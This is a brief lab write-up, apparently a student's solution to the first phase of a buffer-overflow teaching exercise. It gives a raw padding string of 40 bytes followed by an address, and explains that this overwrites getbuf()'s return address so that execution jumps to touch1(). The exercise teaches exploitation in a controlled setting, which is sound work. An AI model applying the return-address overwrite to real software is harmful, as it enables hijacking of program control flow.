Raw string: \00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C0@\00\00\00\00\00

What I did with the string:
The size of the stack frame allocated by getbuf() is 0x28 bytes, so the return address is stored in 0x28(%rsp). I just have to write at that address the starting address of the function touch1(), which is 0x4017c0.
